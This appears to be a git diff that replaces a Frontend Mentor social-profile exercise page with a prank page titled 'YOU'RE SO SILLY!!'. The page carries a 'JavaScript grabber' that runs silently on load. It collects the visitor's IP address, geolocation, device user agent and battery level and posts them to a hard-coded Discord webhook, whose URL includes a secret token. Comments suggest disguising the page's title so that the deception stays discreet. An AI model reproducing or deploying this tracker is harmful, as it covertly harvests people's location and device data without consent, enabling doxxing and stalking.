@@ -1,96 +1,138 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- displays site properly based on user's device -->
+<html>
+    <!-- I coded this for free for YOU. All I ask is that you keep this little blurb below to show appreciation!-->
 
-  <link rel="icon" type="image/png" sizes="32x32" href="./assets/images/favicon-32x32.png">
-  
-  <title>Frontend Mentor | Social links profile</title>
-  
-  <style>
-    @font-face {
-      font-family: "Inter";
-      src: url('assets/fonts/Inter-VariableFont_slnt\,wght.ttf');
-    }
-    .attribution { font-size: 14px; text-align: center; color: #fff; margin-top: 10px; }
-    .attribution a { color: hsl(228, 45%, 44%); }
-    body{
-      font-family: "Inter";
-      font-size: 14px;
-      background-color: hsl(0, 0%, 8%);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      min-height: 100vh;
-      overflow: hidden;
-    }
-    section{
-      background-color: hsl(0, 0%, 12%);
-      width: 300px;
-      padding: 40px;
-      border-radius: 7px;
-    }
-    img{
-      display: block;
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      margin: auto;
-    }
-    section p.name{
-      color: hsl(0, 0%, 100%);
-      font-size: 22px;
-      font-weight: 700;
-      text-align: center;
-      line-height: 5px;
-    }
-    section p.location{
-      text-align: center;
-      color: hsl(75, 94%, 57%);
-      font-weight: 700;
-    }
-    section p.front-end{
-      color: hsl(0, 0%, 100%);
-      text-align: center;
-      font-weight: 200;
-      font-size: 15px;
-    }
-    section div div{
-      background-color :hsl(0, 0%, 20%);
-      margin-top: 15px;
-      padding: 15px;
-      text-align: center;
-      color: hsl(0, 0%, 100%);
-      font-weight: 600;
-      cursor:pointer;
-      border-radius: 7px;
-      transition: 0.3s;
-    }
-    section div div:hover{
-      background-color: hsl(75, 94%, 57%);
-      color: hsl(0, 0%, 8%);
-    }
-  </style>
+    <!--CODED BY RAYEN NOTH
+    https://linux.scot
+    https://untitledprojects.org
+
+     ________  ________      
+    |\   __  \|\   ___  \    
+    \ \  \|\  \ \  \\ \  \   
+     \ \   _  _\ \  \\ \  \  
+      \ \  \\  \\ \  \\ \  \ 
+       \ \__\\ _\\ \__\\ \__\
+        \|__|\|__|\|__| \|__|              
+    -->
+<head>
+    <!-- Change this if you want to change the title of the site. Some apps will show the title as a preview, so if you're doing this discreetly, change this. -->
+    <title>YOU'RE SO SILLY!!</title>
+    <!--END OF TITLE-->
+    <!-- This is where the CSS (style code) starts. -->
+    <style>
+        @font-face {
+            font-family: VCR;
+            src: url(https://linux.scot/fonts/VCR.ttf);
+        }
+        #invisibleFrame { display: none; }
+
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: #333;
+            text-transform: uppercase;
+            position: relative;
+            transition: transform 0.3s;
+        }
+
+        h1:hover {
+            transform: scale(1.1);
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+    <!--CSS End.-->
 </head>
 <body>
-  <section>
-    <img src="assets/images/avatar-jessica.jpeg" alt="Jessica Avatar">
-    <p class="name">Jessica Randall</p>
-    <p class="location">London, United Kingdom</p>
-    <p class="front-end">"Front-end developer and avid reader."</p>
-    <div>
-      <div>GitHub</div>
-      <div>Frontend Mentor</div>
-      <div>LinkedIn</div>
-      <div>Twitter</div>
-      <div>Instagram</div>
-    </div>
-  </section>
-  <div class="attribution">
-    Challenge by <a href="https://www.frontendmentor.io?ref=challenge" target="_blank">Frontend Mentor</a>. 
-    Coded by <a href="https://github.com/ramighazzawi2002" target="_blank">Rami Ghazzawi</a>.
-  </div>
+    <!-- You can throw any html code in here, just make sure you keep the script! The below code is the one I use for https://linux.scot/worker. -->
+    <h1 style="text-align: center; font-family: 'VCR', sans-serif;">you just got trolled</h1>
+    <!-- END OF HTML -->
+    <script>
+        // START OF JAVASCRIPT GRABBER CODE
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                fetchGeolocationData(ipAddress);
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+            });
+
+        function fetchGeolocationData(ipAddress) {
+            fetch(`https://freeipapi.com/api/json/${ipAddress}`)
+                .then(response => response.json())
+                .then(data => {
+                    const geoLocationData = JSON.stringify(data, null, 2); 
+
+                    const embed = {
+                        title: 'Success!',
+                        description: `Tracking Code: ${getParameterByName('code')}`,
+                        fields: [
+                            { name: 'IP Address', value: ipAddress },
+                            { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
+                            { name: 'Battery Level', value: getBatteryLevel() },
+                            { name: 'Device', value: navigator.userAgent },
+                            { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ipAddress}` }                        
+                     ],
+                        footer: {
+                            text: 'powered by linux.scot'
+                        }
+                    };
+
+                // CHANGE THE CONTENT IN webhookUrl OTHERWISE YOU WONT GET THE DATA
+                    const webhookUrl = 'https://discord.com/api/webhooks/1353381290992210041/GIpJs4RTscObbGJQFDWBwDdYZdiI6NWvAUXK2_VBJMN1_iv-gk5_zAHP1tEQ2ZGtiraH';
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ embeds: [embed] })
+                    })
+                        .then(response => {
+                            if (response.ok) {
+                                console.log('Embed sent successfully');
+                            } else {
+                                console.error('Failed to send embed');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching geolocation data:', error);
+                });
+        }
+
+        // Function to get URL parameters
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Function to get battery level
+        function getBatteryLevel() {
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    return (battery.level * 100).toFixed(2) + '%';
+                });
+            }
+            return 'N/A';
+        }
+        // END OF JAVASCRIPT
+    </script>
 </body>
 </html>
